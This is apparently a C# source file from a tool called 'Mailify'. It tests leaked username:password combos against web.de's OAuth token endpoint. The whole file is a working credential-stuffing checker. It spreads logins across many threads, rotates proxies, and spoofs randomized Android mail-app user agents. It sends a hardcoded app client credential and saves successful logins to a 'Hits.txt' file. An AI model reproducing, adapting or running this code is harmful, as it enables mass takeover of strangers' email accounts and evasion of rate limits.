using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Mailify
{
    internal class Web_De
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;

            new Thread(() => Variables.Mail_Mode_Title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();
            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var req = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    req.Proxy.ConnectTimeout = proxyTimeout;
                    req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));


                    char[] charac = "qwertyuiopasdfghjklzxcvbnm".ToCharArray();
                    Random r = new Random();
                    string s = charac[r.Next(0, 26)].ToString();
                    string s1 = charac[r.Next(0, 26)].ToString();
                    string s2 = charac[r.Next(0, 26)].ToString();
                    string s3 = charac[r.Next(0, 26)].ToString();
                    string s12 = "LGM-" + s + "u" + s1 + "d" + s2 + "d0" + s3 + "u";
                    string s4 = charac[r.Next(0, 26)].ToString();
                    string s5 = charac[r.Next(0, 26)].ToString();
                    string s6 = charac[r.Next(0, 26)].ToString();
                    string s7 = charac[r.Next(0, 26)].ToString();
                    string s8 = charac[r.Next(0, 26)].ToString();
                    string s9 = charac[r.Next(0, 26)].ToString();
                    string useragent = "webde.android.androidmail/6.19.2 Dalvik/2.1.0 (Linux; U; Android 6.0.1; " + s12 + " Build/" + s4 + "u" + s5 + "d" + s6 + "u" + s7 + "d" + s8 + "d" + s9 + "u)";
                    req.AddHeader("Authorization", "Basic d2ViZGVfbWFpbGFwcF9hbmRyb2lkOnRtQVM3aUpXQ0syUElYNWVGa1JJUm9vdmRhN25HcnNJTXpIeThBRkM=");
                    req.AddHeader("User-Agent", useragent);
                    req.AddHeader("X-UI-APP", "webde.android.androidmail/6.19.2");
                    req.AddHeader("Host", "oauth2.web.de");
                    req.AddHeader("Connection", "Keep-Alive");
                    req.AddHeader("Accept-Encoding", "gzip");
                    string post = req.Post("https://oauth2.web.de/token", "grant_type=password&username=" + credentials[0] + "&password=" + credentials[1]+ "&device_name=LGE " + s12, "application/x-www-form-urlencoded").ToString();
                    if (post.Contains("\"access_token\":\""))
                    {
                        Variables.Valid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            if (Config.kekr_UI == "LOG")
                            {
                                Console.WriteLine($"[+] {combo}", Color.Green);
                            }
                            File.AppendAllText(Variables.results + "Hits.txt", combo + Environment.NewLine);
                        }
                    }
                    else if (post.Contains("\"error_description\":\"Perm.ACCOUNT_NOT_FOUND_OR_PASSWORD_WRONG\"") || post.Contains("\"error_description\":\"Perm.BAD_REQUEST\""))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }

                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}